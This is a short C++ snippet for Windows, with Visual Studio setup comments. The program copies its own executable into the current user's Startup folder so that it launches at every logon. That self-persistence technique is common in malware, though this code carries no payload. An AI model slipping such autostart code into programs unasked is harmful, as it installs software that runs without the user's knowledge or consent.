//use _CRT_SECURE_NO_WARNINGS - how to use in visual studio click project,yourprojectname properties,configuration properties,c/c++,preprocessor,click on near the preprocessor definitions on text,click on button created,edit,add _CRT_SECURE_NO_WARNINGS
//use multi-byte character from project,yourprojectname properties,configuration properties,general set character set to multi-byte character
#include "stdafx.h"
#include <Windows.h>
#include <lmcons.h>
#include <iostream>
#include <string>
using namespace std;
int _tmain(int argc, _TCHAR* argv[])
{
	TCHAR username[UNLEN + 1];
	DWORD sizeofuser = UNLEN + 1;
	GetUserName((TCHAR*)username, &sizeofuser);
	char* user = getenv("username");
	string windowsuserdir = "C:\\Users\\" + string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\yourfilename.exe";
	char filename[MAX_PATH];
	auto newlocation = windowsuserdir.c_str();
	DWORD sizeoffilename = GetModuleFileNameA(NULL, filename, MAX_PATH);
	if (sizeoffilename)
	{
		CopyFile(filename, newlocation, TRUE);
	}
	return 0;
}